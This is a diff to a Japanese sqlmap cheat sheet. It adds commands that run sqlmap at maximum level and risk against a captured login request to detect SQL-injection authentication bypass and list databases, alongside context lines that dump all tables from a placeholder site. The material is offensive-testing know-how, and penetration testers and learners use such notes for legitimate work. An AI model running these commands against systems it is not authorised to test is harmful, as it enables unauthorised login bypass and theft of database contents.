@@ -69,6 +69,16 @@ sqlmap -r req.txt-p  -D <database_name> --dump-all
 sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
 ```
 
+```sh
+# 失敗時の文字列指定かつレベルとリスクを上げることで、比較的単純な認証バイパスを検出しやすくする。
+```sh
+sqlmap -r ./login.txt --level=5 --risk=3 --not-string="Invalid username or password." --dbs --batch
+
+# Boolean ベースに絞る（認証バイパスできるかどうか）
+sqlmap -r ./login.txt --level=5 --risk=3 --technique=B --not-string="Invalid username or password." --dbs --batch
+```
+```
+
 ```shell
 # キャッシュを使わず、新しくデータを取得しなおす
 --flush-session
@@ -114,4 +124,3 @@ sqlmap --list-tampers
 ```sh
 --tamper=<tamper-name>
 ```
-
